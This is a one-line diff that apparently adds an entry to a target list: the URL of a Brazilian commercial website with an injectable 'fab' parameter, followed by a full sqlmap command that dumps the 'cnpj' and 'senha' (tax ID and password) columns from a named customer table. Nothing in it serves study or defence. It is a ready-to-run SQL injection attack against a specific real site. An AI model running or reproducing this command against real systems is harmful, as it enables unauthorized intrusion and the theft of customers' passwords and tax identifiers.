@@ -1,0 +1,1 @@
+https://www.27desetembro.com.br/fabricante.php?fab=91 (GET)  # sqlmap.py -u https://www.27desetembro.com.br/fabricante.php?fab=91 -D desetembro_site -T clientes -C cnpj,senha --dump --threads 5 -v3
